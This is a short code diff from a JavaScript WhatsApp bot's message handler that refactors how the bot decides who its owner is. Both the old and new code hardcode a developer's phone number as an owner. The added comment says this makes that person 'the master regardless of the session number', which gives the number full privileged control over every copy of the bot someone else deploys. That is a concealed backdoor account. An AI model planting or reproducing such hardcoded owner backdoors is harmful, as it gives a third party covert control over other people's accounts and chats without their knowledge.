@@ -102,12 +102,15 @@ const {
     }
     const mek = chatUpdate.messages[0];
 	  // ==================================
+// --- Standardize identification ---
+const devNumber = "254769995625"; // The number brought by .owner
 const ownerNumber = botNumber.replace(/[^0-9]/g, "");   
-const senderNumber = sender.split("@")[0];              
-const isOwner = senderNumber === ownerNumber || senderNumber === "254769995625";
+const senderNumber = sender.split("@")[0];
+
+// This makes YOU the master regardless of the session number
+const isOwner = senderNumber === ownerNumber || senderNumber === devNumber;
 const isSudo = await isSudoOwner(senderNumber);
-const isPrivileged = isOwner || isSudo;
-const dev = "254769995625"; 
+const isPrivileged = isOwner || isSudo; // Full access group
 //========================================================================================================================//	  
     const getGroupAdmins = (participants) => { 
        let admins = []; 
